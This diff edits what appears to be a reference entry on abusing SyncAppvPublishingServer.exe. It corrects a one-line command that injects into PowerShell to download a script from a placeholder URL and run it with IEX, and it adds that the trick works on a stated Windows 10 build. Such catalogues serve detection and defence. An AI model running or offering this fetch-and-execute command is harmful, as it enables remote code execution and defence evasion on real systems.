@@ -3,7 +3,7 @@
 * Functions: Execute
 
 ```
-SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX
+SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
 ```
 
 Acknowledgements:
@@ -23,6 +23,6 @@ C:\Windows\System32\SyncAppvPublishingServer.exe
 Notes:
 Command injection into PowerShell
 Might have been fixed in newest version of Windows 10.
-
+(Works as of 10.0.16299.371)
 
  
